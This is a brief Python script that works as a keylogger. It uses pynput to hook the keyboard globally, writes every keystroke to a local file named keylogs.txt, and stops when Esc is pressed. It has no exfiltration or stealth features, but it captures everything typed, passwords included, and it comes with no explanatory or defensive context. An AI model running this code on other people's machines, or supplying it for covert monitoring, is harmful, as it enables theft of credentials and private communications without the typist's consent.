import os
from pynput import keyboard

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as file:
            if hasattr(key, 'char'):
                file.write(f'{key.char}')
            else:
                file.write(f'{str(key)}')
    except Exception as e:
        print(f"Error writing to file: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()